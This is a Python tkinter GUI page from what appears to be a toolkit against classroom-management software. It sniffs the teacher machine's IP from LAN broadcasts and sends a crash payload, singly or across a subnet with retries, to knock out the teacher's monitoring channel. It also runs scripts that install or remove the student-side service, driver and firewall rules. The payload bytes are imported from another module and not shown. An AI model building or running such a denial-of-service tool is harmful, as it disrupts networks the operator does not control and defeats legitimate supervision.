# src/gui/pages/page_advanced.py
# 高级页 —— 远程崩溃 + 学生端安装测试

import tkinter as tk
from tkinter import ttk, messagebox

from src.modules.remote_crasher import (
    crash, crash_targets, expand_cidr, parse_payload, DEFAULT_PORT,
    build_original_payload, RESULT_OK, RESULT_FAIL,
)
from src.modules.teacher_control import listen_teacher_ip, read_local_channel
from src.utils.logger import info, warn, error, debug


class PageAdvanced:

    def __init__(self, ui):
        self.ui = ui
        self._discovered = []
        self._busy = False

    # ─────────────────────────── UI 构建 ───────────────────────────

    def build(self):
        ui = self.ui
        frame = ttk.Frame(ui.notebook)

        # ---- 上部：控件（可滚动） ----
        _, ctrl_frame = ui.make_scrollable(frame)

        self._build_crash_section(ctrl_frame)
        self._build_install_section(ctrl_frame)

        # ---- 下部：输出区域（固定底部） ----
        output_frame = ttk.Frame(frame)
        output_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=5, pady=2)
        self.result_text = ui.make_output_text(output_frame, height=6)

        return frame

    def _build_crash_section(self, ctrl_frame):
        ui = self.ui
        info_frame = ttk.LabelFrame(ctrl_frame, text="远程功能（崩溃载荷）", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        ttk.Label(info_frame, text="向目标 IP 发送崩溃载荷，触发教师端监控通道崩溃。\n"
                  "逆向确认：9003 未监听时自动重试；收到'被迫关闭连接'=崩溃已触发。",
                  foreground="gray", wraplength=520).pack(anchor=tk.W, padx=2)

        addr_frame = ttk.Frame(info_frame)
        addr_frame.pack(fill=tk.X, padx=2, pady=5)
        ttk.Label(addr_frame, text="目标 IP/网段:").pack(anchor=tk.W)
        ip_row = ttk.Frame(addr_frame)
        ip_row.pack(fill=tk.X, pady=2)
        self.ip_input = ttk.Entry(ip_row)
        self.ip_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
        ui.bind_tooltip(self.ip_input, "FUNC_CRASH_IP")
        self.btn_auto_teacher = ttk.Button(ip_row, text="自动获取教师端IP",
                                           command=self._do_auto_teacher_ip)
        self.btn_auto_teacher.pack(side=tk.LEFT, padx=4)
        ui.bind_tooltip(self.btn_auto_teacher,
                        "监听局域网 7777 教师广播，自动把教师机 IP 填入目标框")

        # ── 自定义开关：默认不显示端口/载荷，直接用默认值发送 ──
        self.var_crash_custom = tk.BooleanVar(value=False)
        chk_custom = ttk.Checkbutton(
            info_frame, text="自定义端口 / 载荷（不勾选则用默认值发送）",
            variable=self.var_crash_custom, command=self._toggle_crash_custom)
        chk_custom.pack(anchor=tk.W, padx=2, pady=(4, 0))

        # 自定义参数区（默认隐藏；勾选后显示，已预填默认值可改）
        self.crash_custom_frame = ttk.Frame(info_frame)

        ttk.Label(self.crash_custom_frame, text="端口:").pack(anchor=tk.W, padx=2)
        self.port_input = ttk.Entry(self.crash_custom_frame)
        self.port_input.insert(0, str(DEFAULT_PORT))
        self.port_input.pack(fill=tk.X, padx=2, pady=2)
        ui.bind_tooltip(self.port_input, "FUNC_CRASH_PORT")

        ttk.Label(self.crash_custom_frame, text="载荷:（留空 = 使用原版动态载荷）").pack(anchor=tk.W, padx=2)
        self.payload_input = ttk.Entry(self.crash_custom_frame)
        # 预填一份原版载荷样例（hex），用户可在此基础上修改
        try:
            self.payload_input.insert(0, build_original_payload().decode("ascii"))
        except Exception:
            self.payload_input.insert(0, "")
        self.payload_input.pack(fill=tk.X, padx=2, pady=2)
        ui.bind_tooltip(self.payload_input, "FUNC_CRASH_PAYLOAD")

        btn_crash = ttk.Button(info_frame, text="发送崩溃指令",
                               command=self._do_crash)
        btn_crash.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_crash, "FUNC_CRASH_SEND")
        self._crash_send_btn = btn_crash  # 供自定义区插在它前面用

    def _toggle_crash_custom(self):
        """勾选/取消自定义：显示或隐藏端口/载荷输入区。"""
        if self.var_crash_custom.get():
            self.crash_custom_frame.pack(
                fill=tk.X, padx=2, pady=2, before=self._crash_send_btn)
        else:
            self.crash_custom_frame.pack_forget()

    def _build_install_section(self, ctrl_frame):
        ui = self.ui
        install_frame = ttk.LabelFrame(ctrl_frame, text="学生端安装测试", padding=5)
        install_frame.pack(fill=tk.X, pady=2)
        ttk.Label(install_frame, text="在指定目录下注册 MMPC 服务、安装管控驱动、添加防火墙规则。",
                  foreground="gray").pack(anchor=tk.W, padx=2)

        ttk.Label(install_frame, text="学生端套件目录（含 MMPC.exe / DriverInstall.exe）:").pack(anchor=tk.W, padx=2)
        self.install_dir = ttk.Entry(install_frame)
        from src.core.settings import toolkit_cfg
        self.install_dir.insert(0, toolkit_cfg.oseasy_path)
        self.install_dir.pack(fill=tk.X, padx=2, pady=2)

        btn_install = ttk.Button(install_frame, text="生成并运行安装测试脚本",
                                 command=self._do_install_test)
        btn_install.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_install, "FUNC_INSTALL_STUDENT_TEST")

        btn_uninstall = ttk.Button(install_frame, text="生成并运行卸载测试脚本",
                                   command=self._do_uninstall_test)
        btn_uninstall.pack(fill=tk.X, padx=2, pady=5)
        ui.bind_tooltip(btn_uninstall, "FUNC_UNINSTALL_STUDENT_TEST")

    # ─────────────────────────── 动作 ───────────────────────────

    def _do_auto_teacher_ip(self):
        """监听局域网 7777 教师广播，自动把教师机 IP 填入崩溃目标框。

        教师端每 ~1s 广播一次 teacherip，所以监听几秒内通常能拿到。
        在后台线程运行（UDP 等待不阻塞 GUI），完成后调度回主线程填入 IP。
        """
        ui = self.ui
        # 防重复触发
        if getattr(self, "_auto_busy", False):
            ui.show_snakemessage("正在监听教师广播，请稍候…")
            return
        self._auto_busy = True
        self.btn_auto_teacher.config(state="disabled", text="监听中…")

        # 先读本机频道（2^N 位掩码），用于过滤 teacherip 广播
        ch_num, ch_mask = read_local_channel()
        if ch_mask is not None:
            ui.append_text(self.result_text,
                           f"[自动获取] 本机频道 {ch_num} → 只接受 channel={ch_mask} 的广播", ui.root)
        else:
            ui.append_text(self.result_text,
                           "[自动获取] 未找到 core.conf，接受任意频道广播", ui.root)

        def _run():
            try:
                tip = listen_teacher_ip(timeout=8.0, expected_channel=ch_mask)
            except OSError as exc:
                tip = None
                err = str(exc)
                ui.root.after(0, lambda: self._auto_teacher_done(
                    None, f"无法监听 7777 端口：{err}\n（可能被学生端进程占用，需以管理员或改用 pktmon 确认）"))
                return
            ui.root.after(0, lambda: self._auto_teacher_done(tip))

        ui.clear_text(self.result_text)
        ui.append_text(self.result_text, "[自动获取] 正在监听局域网 7777 教师广播…", ui.root)
        ui._run_in_thread(_run, "自动获取教师端IP")

    def _auto_teacher_done(self, tip, msg=None):
        """主线程回调：把拿到的教师机 IP 填入目标框并恢复按钮。"""
        self._auto_busy = False
        self.btn_auto_teacher.config(state="normal", text="自动获取教师端IP")
        if msg:
            self.ui.append_text(self.result_text, msg, self.ui.root)
            self.ui.show_snakemessage("自动获取教师端IP失败")
            return
        if tip:
            self.ip_input.delete(0, tk.END)
            self.ip_input.insert(0, tip)
            self.ui.append_text(self.result_text, f"[自动获取] 已填入教师机 IP：{tip}", self.ui.root)
            self.ui.show_snakemessage(f"已填入教师机 IP：{tip}")
        else:
            self.ui.append_text(
                self.result_text,
                "[自动获取] 超时未捕获到教师广播（确认教师端在线且在同一网段）",
                self.ui.root,
            )
            self.ui.show_snakemessage("未获取到教师端IP（教师广播不可达）")

    def _do_crash(self):
        """发起崩溃指令发送（后台线程执行，完成后主线程弹窗）。

        交互逻辑：
          - 成功 → 弹 info 对话框，显示详细结果
          - 失败 → 弹 askyesno 对话框，显示错误详情，询问是否重试
        """
        ui = self.ui
        ip = self.ip_input.get().strip()
        if not ip:
            ui.show_snakemessage("请先填写目标 IP/网段")
            return
        # 默认用默认值发送；仅当勾选"自定义"时才读取端口/载荷输入框
        if self.var_crash_custom.get():
            try:
                port = int(self.port_input.get().strip() or DEFAULT_PORT)
            except ValueError:
                ui.show_snakemessage("端口必须是数字")
                return
            payload = parse_payload(self.payload_input.get())
        else:
            port = int(DEFAULT_PORT)
            payload = parse_payload("")  # 空 → 原版动态载荷

        def _run():
            if "/" in ip:
                hosts = expand_cidr(ip)
                result = crash_targets(hosts[:64], port, payload)
            else:
                result = crash(ip, port, payload)
            # 线程内不能直接弹窗（Tk 非线程安全），调度回主线程
            ui.root.after(0, lambda: self._crash_done(result, ip, port, payload))

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在向 {ip}:{port} 发送崩溃指令...", ui.root)
        ui._run_in_thread(_run, "远程崩溃")

    def _crash_done(self, result: str, ip: str, port: int, payload: bytes):
        """主线程回调：追加结果 + 按成功/失败弹对话框。"""
        self.ui.append_text(self.result_text, result, self.ui.root)
        detail = result.replace(RESULT_OK, "").replace(RESULT_FAIL, "").strip()
        is_ok = result.startswith(RESULT_OK)
        if is_ok:
            messagebox.showinfo(
                "崩溃指令已触发",
                f"目标: {ip}:{port}\n载荷: {payload!r}\n\n"
                f"✅ 发送成功\n\n{detail}",
            )
        else:
            retry = messagebox.askyesno(
                "崩溃指令发送失败",
                f"目标: {ip}:{port}\n载荷: {payload!r}\n\n"
                f"❌ 发送失败\n\n{detail}\n\n"
                f"是否重试？",
            )
            if retry:
                # 递归重跑（复用当前 GUI 输入）
                self._do_crash()

    def _do_install_test(self):
        """生成并运行学生端安装测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_install_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"安装测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行安装测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端安装测试")

    def _do_uninstall_test(self):
        """生成并运行学生端卸载测试脚本"""
        ui = self.ui
        base = self.install_dir.get().strip()
        from src.core.settings import toolkit_cfg
        if not base:
            base = toolkit_cfg.oseasy_path
        import os
        if not os.path.isdir(base):
            ui.show_snakemessage(f"目录不存在: {base}")
            return

        from src.modules.script_generator import script_gen

        def _on_output(line):
            self.ui.append_text(self.result_text, line, ui.root)

        def _run():
            path = script_gen.run_uninstall_student_test(on_output=_on_output)
            self.ui.append_text(self.result_text, f"卸载测试脚本已运行: {path}", ui.root)

        self.ui.clear_text(self.result_text)
        self.ui.append_text(self.result_text, f"正在生成并运行卸载测试脚本（目录: {base}）...", ui.root)
        ui._run_in_thread(_run, "学生端卸载测试")

